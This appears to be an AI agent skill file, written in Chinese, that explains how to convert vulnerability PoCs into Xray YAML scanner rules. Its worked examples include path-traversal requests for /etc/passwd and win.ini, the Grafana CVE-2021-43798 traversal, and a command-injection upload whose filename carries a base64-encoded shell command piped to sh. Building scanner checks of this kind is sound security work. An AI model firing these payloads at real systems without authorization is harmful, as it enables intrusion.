---
name: xray-poc-converter
description: |
  将互联网上的 POC 内容（如 HTTP 请求包、漏洞描述等）转换为长亭 Xray 可用的 YAML POC 规则。

  触发词：「转POC」「转成xray」「转yaml」「生成POC」「帮我写个xray规则」「从nuclei转」「从goby转」「CVE转POC」

  使用场景：
  1. 将 HTTP 请求包转换为 Xray POC YAML 格式
  2. 根据漏洞描述生成功能完整的 POC
  3. 优化现有 POC 以符合高质量规范
  4. 将其他格式的 POC（如 Nuclei、Goby）转换为 Xray 格式

  支持转换的漏洞类型：文件读取、SQL 注入、命令执行、反序列化、XXE、SSRF、未授权访问等。

  默认输出路径：D:\Tools\xray\pocs
---

# Xray POC 转换器

本 skill 用于将各种格式的 POC 内容转换为长亭 Xray 扫描器可用的 YAML 格式 POC 规则。

## 使用方法

用户可以提供以下格式的 POC 内容：
1. **HTTP 请求包** - 原始的 HTTP 请求文本
2. **漏洞描述** - 文字描述的漏洞信息
3. **其他工具 POC** - 如 Nuclei、Goby、SQLMap 等的 POC 格式
4. **CVE 信息** - CVE 编号和相关描述

## 配置说明

### 默认输出路径

POC 文件默认生成路径：`D:\Tools\xray\pocs`

该路径为 Xray 扫描器的 POC 存放目录，生成的 POC 文件会自动保存到此目录，可直接被 Xray 扫描器加载使用。

**文件命名规范：**
- 格式：`漏洞名称_漏洞类型.yaml`
- 示例：`mete_crm_headimgsave_sqli.yaml`、`nips_users_json_leak.yaml`
- 使用小写字母和下划线
- 包含漏洞类型标识（sqli、rce、file-read、xxe 等）

### 自定义输出路径

如果用户指定了其他输出路径，则使用用户指定的路径。优先级：
1. 用户指定的路径（最高优先级）
2. 默认路径 `D:\Tools\xray\pocs`

## 转换流程

### 1. 分析输入内容

**输入识别规则：**

| 输入格式 | 识别方式 | 对应处理 |
|---------|---------|---------|
| HTTP 请求包 | 首行是 `GET/POST/PUT/DELETE` 等 | 解析请求行+头部+body |
| 漏洞描述文字 | 无 HTTP 结构，纯文字描述 | 提取接口路径+参数+漏洞类型 |
| Nuclei/Goby YAML | 含 `id:` `info:` 等字段 | 提取 path、matchers、type |
| CVE 编号 | 格式为 `CVE-YYYY-NNNNN` | 先搜索漏洞详情再转换 |

**边界处理：**
- 输入为空 → 询问用户「请提供 HTTP 请求包或漏洞描述」
- 输入无法识别类型 → 假设为漏洞描述文本，按「参数+接口+漏洞类型」模式处理
- 不支持的漏洞类型（如逻辑漏洞、DOM XSS）→ 在输出中标注「此漏洞类型暂不支持自动转换，建议手动编写」

### 2. 提取关键信息

从 HTTP 请求中依次提取：

```
Method → 从第一行提取（如 GET、POST）
Path   → 从第一行 / 后提取（如 /api/exec）
Headers → 从请求行下方的键值对提取，保留必要的（Host、Content-Type）
Body   → 从空行后提取（如有）
```

**expression 自动推导规则：**
- 文件读取：`response.body_string.contains(...)` 或 `.matches(...)`
- 命令执行：使用 `randomInt()` 生成随机数，计算后验证结果
- SQL注入：报错型用 `contains(substr(md5(...),...))`，时间盲注用 `latency - r0latency >= ...`
- 未授权访问：结合状态码 + 内容特征

### 3. 生成 POC

根据漏洞类型从 `references/poc_template.md` 选择对应模板，填充提取的信息。

**生成规则：**
- **Body 格式必须使用单行字符串**，不能使用多行 `|` 语法
- 换行使用 `\r\n`（HTTP 标准），不是 `\n`
- Body 中的引号必须转义为 `\"`
- Headers 的值必须用引号包裹（如 `"multipart/form-data; boundary=xxx"`）
- 每个规则的 expression 必须在 request 同级，不能嵌套
- 最终 expression 必须是单行，不能使用 `|` 多行语法
- 状态码匹配必须精确（如 502 就写 502，不要写 200）
- 所有 YAML 字段对齐使用空格（2空格缩进）

**正确示例：**
```yaml
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /api/upload
      headers:
        Content-Type: "multipart/form-data; boundary=----Boundary"
      body: "------Boundary\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\ntest\r\n------Boundary--"
    expression: response.status == 502
  r1:
    request:
      cache: true
      method: GET
      path: /test.txt
    expression: response.status == 200 && response.body_string.contains("uid=")
expression: r0() && r1()
```

**错误示例（不要这样写）：**
```yaml
# ❌ 错误：body 使用多行语法
body: |
  ------Boundary
  Content-Disposition: form-data
  
# ❌ 错误：expression 嵌套在 request 内
request:
  method: GET
  expression: response.status == 200

# ❌ 错误：最终 expression 使用多行
expression: |
  r0() && r1()

# ❌ 错误：Headers 值没有引号
Content-Type: multipart/form-data
```

### 4. 关键信息确认（必须询问）

在生成 POC 前，**必须向用户确认以下关键信息**：

**对于命令执行类漏洞：**
1. **第一个请求（r0）的预期状态码是什么？**
   - 示例：「执行命令后返回 200 还是 502？还是其他状态码？」
   - 如果不确定，询问：「你手动测试时，发送 payload 后服务器返回什么状态码？」

2. **生成的文件路径和访问路径是否一致？**
   - 示例：「命令写入 `/ysdisk/www/webfile/poc.txt`，访问路径是 `/poc.txt` 对吗？」
   - 如果路径不同，询问：「Web 根目录是什么？访问路径应该是什么？」

3. **是否需要随机文件名？**
   - 示例：「使用固定文件名 `poc.txt` 还是随机文件名避免冲突？」

4. **验证内容的特征是什么？**
   - 示例：「文件内容包含 `uid=` 就能确认漏洞吗？还是需要其他特征？」
   - 如果用户提供了实际输出（如 `uid=0(ls@yf) gid=0(root)`），使用更精确的匹配

**对于文件读取类漏洞：**
1. **是否需要同时支持 Linux 和 Windows？**
2. **文件内容的特征字符串是什么？**

**对于 SQL 注入类漏洞：**
1. **是报错型、时间盲注还是布尔盲注？**
2. **基准请求（r0）的延迟是多少？**（时间盲注必须）

### 5. YAML 语法校验

生成 POC 后，**必须先进行 YAML 语法校验**：

```python
import yaml
import sys

try:
    with open('poc.yaml', 'r', encoding='utf-8') as f:
        yaml.safe_load(f)
    print("✓ YAML 语法正确")
    sys.exit(0)
except yaml.YAMLError as e:
    print(f"✗ YAML 语法错误: {e}")
    sys.exit(1)
```

**校验步骤：**
1. 使用 Python 的 `yaml.safe_load()` 解析生成的 YAML
2. 如果解析成功，显示 "✓ YAML 语法正确"
3. 如果解析失败，显示具体错误信息并修复

**常见 YAML 语法错误：**
- 缩进不一致（必须使用 2 空格）
- 引号未闭合
- 特殊字符未转义
- 冒号后缺少空格
- 多行字符串格式错误

### 6. 用户确认（检查点）

YAML 校验通过后，**在写入文件前暂停**，展示：

```
生成的 POC 预览：
---
name: xxx
path: D:\Tools\xray\pocs/xxx.yaml
YAML 语法: ✓ 正确
---

请确认：
1. POC 内容是否正确？
2. 保存路径是否正确？
3. 是否需要调整？

回复「确认」写入，「修改+具体要求」进行调整，「取消」放弃。
```

**危险操作拦截：**
- 如果用户提供的输出路径含系统敏感目录（`/etc/`、`C:\Windows\System32\`）→ 拒绝写入，提示路径无效
- 如果 POC 包含破坏性指令（删除文件、修改配置）→ 拒绝生成，提示违反无害性原则

## POC 结构

```yaml
name: poc-yaml-漏洞名称
transport: http
set:
  # 随机变量定义
rules:
  # 规则定义
expression: |
  # 匹配表达式
detail:
  # 详情信息
```

## 核心原则

转换时必须遵守以下原则：

1. **无害性** - POC 不能执行破坏性操作（删除文件、修改密码等）
2. **随机性** - 使用随机值验证，避免固定值
3. **确定性** - 匹配规则必须唯一确定，避免误报
4. **通用性** - 支持多平台（Linux/Windows）和多版本

## 参考文档

- **POC 模板参考**：[references/poc_template.md](references/poc_template.md)
- **表达式函数**：[references/expression_functions.md](references/expression_functions.md)
- **高质量规范**：[references/best_practices.md](references/best_practices.md)

## 转换示例

### 示例 1：HTTP 请求包转 POC

**输入：**
```http
GET /download?file=../../../etc/passwd HTTP/1.1
Host: target.com
```

**输出：**
```yaml
name: poc-yaml-example-file-read
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
  r1:
    request:
      cache: true
      method: GET
      path: /download?file=..%2f..%2f..%2f..%2fc:%2fwindows%2fwin.ini
    expression: |
      response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: |
  r0() || r1()
detail:
  author: xray-poc-converter
  links:
    - https://example.com
```

### 示例 2：命令执行漏洞（文件写入验证）

**输入：**
```http
POST /cgi/webcgi?syscore=checklogin HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCheck

------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="file"; filename="1/;echo aWQgPiAveXNkaXNrL3d3dy93ZWJmaWxlL3BvYy50eHQ= | base64 -d | sh &#"
Content-Type: text/plain

1111
------WebKitFormBoundaryCheck--
```

**输出：**
```yaml
name: poc-yaml-webcgi-rce-file-write
transport: http
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /cgi/webcgi?syscore=checklogin
      headers:
        Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryCheck"
      body: "------WebKitFormBoundaryCheck\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1/;echo aWQgPiAveXNkaXNrL3d3dy93ZWJmaWxlL3BvYy50eHQ= | base64 -d | sh &#\"\r\nContent-Type: text/plain\r\n\r\n1111\r\n------WebKitFormBoundaryCheck--"
    expression: response.status == 502
  r1:
    request:
      cache: true
      method: GET
      path: /poc.txt
    expression: response.status == 200 && response.body_string.contains("uid=") && response.body_string.contains("gid=")
expression: r0() && r1()
detail:
  author: xray-poc-converter
  links:
    - https://example.com
```

## Xray POC 完整语法规范

### 1. 顶层字段

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `name` | string | 是 | POC 名称，格式：`poc-yaml-漏洞名称` |
| `transport` | string | 是 | 传输协议：`http` 或 `tcp` |
| `manual` | bool | 否 | 是否手动触发，默认 `false` |
| `set` | map | 否 | 变量定义（支持随机函数） |
| `rules` | map | 是 | 规则定义（r0, r1, r2...） |
| `expression` | string | 是 | 最终匹配表达式 |
| `detail` | map | 否 | 元数据（author, links, description） |

### 2. Request 字段

| 字段 | 类型 | 说明 |
|------|------|------|
| `cache` | bool | 是否缓存请求（默认 true） |
| `method` | string | HTTP 方法（GET/POST/PUT/DELETE/PATCH） |
| `path` | string | 请求路径（支持 `{{变量}}` 插值） |
| `headers` | map | 请求头（键值对） |
| `body` | string | 请求体（支持多行 `|` 语法） |
| `follow_redirects` | bool | 是否跟随重定向（默认 false） |

### 3. 表达式函数

#### 字符串函数
| 函数 | 说明 | 示例 |
|------|------|------|
| `contains(str)` | 字符串包含 | `response.body_string.contains("admin")` |
| `matches(regex)` | 正则匹配（字符串） | `"root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)` |
| `bmatches(bytes)` | 正则匹配（字节） | `"\\x89PNG".bmatches(response.body)` |
| `bcontains(bytes)` | 字节包含 | `response.body.bcontains(b"test")` |
| `bstartsWith(bytes)` | 字节开头匹配 | `response.body.bstartsWith(bytes("HTTP"))` |
| `substr(str, start, length)` | 字符串截取 | `substr(md5(string(s1)), 2, 28)` |

#### 编码/转换函数
| 函数 | 说明 | 示例 |
|------|------|------|
| `string(val)` | 转字符串 | `string(s1 - s2)` |
| `bytes(str)` | 转字节 | `bytes(string(s1))` |
| `base64(str)` | Base64 编码 | `base64(rand)` |
| `base64Decode(str)` | Base64 解码 | `base64Decode("dGVzdA==")` |
| `upper(str)` | 转大写 | `upper(rand)` |
| `lower(str)` | 转小写 | `lower(rand)` |
| `md5(str)` | MD5 哈希 | `md5(string(s1))` |

#### 随机函数
| 函数 | 说明 | 示例 |
|------|------|------|
| `randomInt(min, max)` | 随机整数 | `randomInt(100000, 200000)` |
| `randomLowercase(length)` | 随机小写字母 | `randomLowercase(8)` |

#### 响应对象属性
| 属性 | 说明 | 示例 |
|------|------|------|
| `response.status` | HTTP 状态码 | `response.status == 200` |
| `response.body` | 响应体（字节） | `response.body.bcontains(b"test")` |
| `response.body_string` | 响应体（字符串） | `response.body_string.contains("admin")` |
| `response.headers` | 响应头 | `response.headers["Content-Type"].contains("json")` |
| `response.latency` | 响应延迟（毫秒） | `response.latency - r0latency >= 5000` |
| `response.raw` | 原始响应 | `response.raw.bcontains(b"HTTP/1.1")` |

#### 规则引用
| 语法 | 说明 | 示例 |
|------|------|------|
| `r0()` | 调用规则 r0 | `r0() && r1()` |
| `r0latency` | 获取 r0 的延迟 | `response.latency - r0latency >= 5000` |

#### 逻辑运算符
| 运算符 | 说明 |
|--------|------|
| `&&` | 逻辑与 |
| `||` | 逻辑或 |
| `==` | 等于 |
| `!=` | 不等于 |
| `>`, `<`, `>=`, `<=` | 比较运算符 |
| `!` | 逻辑非 |

### 4. 变量插值

在 `path`、`headers`、`body` 中使用 `{{变量名}}` 引用 `set` 中定义的变量：

```yaml
set:
  s1: randomInt(100000, 200000)
  rand: randomLowercase(8)
rules:
  r0:
    request:
      path: /api?id={{s1}}
      body: |
        username={{rand}}
```

### 5. 多行字符串

使用 `|` 保留换行，使用 `>` 折叠换行：

```yaml
body: |
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="file"
  
  test
  ------WebKitFormBoundary--
```

### 6. 规则执行顺序

- 规则按 `r0`, `r1`, `r2`... 顺序定义
- `expression` 中通过 `r0()`, `r1()` 调用规则
- 规则只有在 `expression` 中被调用时才执行
- 支持短路求值：`r0() && r1()` 中 r0 失败则不执行 r1

### 示例 3：Nuclei YAML 转 Xray

**输入：**
```yaml
id: CVE-2021-43798-grafana
info:
  name: Grafana File Read
  severity: high
  author: test
  matchers:
    - type: regex
      part: body
      regex:
        - "root:.*?:[0-9]+:[0-9]+:"
```

**输出：**
```yaml
name: poc-yaml-grafana-cve-2021-43798
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
  r1:
    request:
      cache: true
      method: GET
      path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini
    expression: |
      response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: |
  r0() || r1()
detail:
  author: xray-poc-converter
  links:
    - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
```

**Nuclei → Xray 字段映射：**
| Nuclei 字段 | Xray 字段 | 说明 |
|------------|----------|------|
| `id` | `name` | 转为 `poc-yaml-{id}` |
| `info.name` | `detail.description` | 漏洞名称 |
| `matchers[].regex` | `expression` | 正则转 expression |
| `path`（从匹配请求提取） | `rules[].request.path` | 请求路径 |

## 注意事项

1. 转换后的 POC 必须经过测试验证
2. 确保匹配规则的唯一性，避免误报
3. 对于时间盲注，需要设置合理的延迟时间
4. 文件读取类漏洞需要同时支持 Linux 和 Windows
5. 使用随机值时，确保随机范围足够大
6. **POC 文件默认保存到 `D:\Tools\xray\pocs` 目录**
7. 文件命名遵循规范：`漏洞名称_漏洞类型.yaml`
8. 确保生成的 POC 文件符合 Xray 的语法规范
9. 在 detail 部分添加完整的漏洞描述和 FOFA 搜索语法
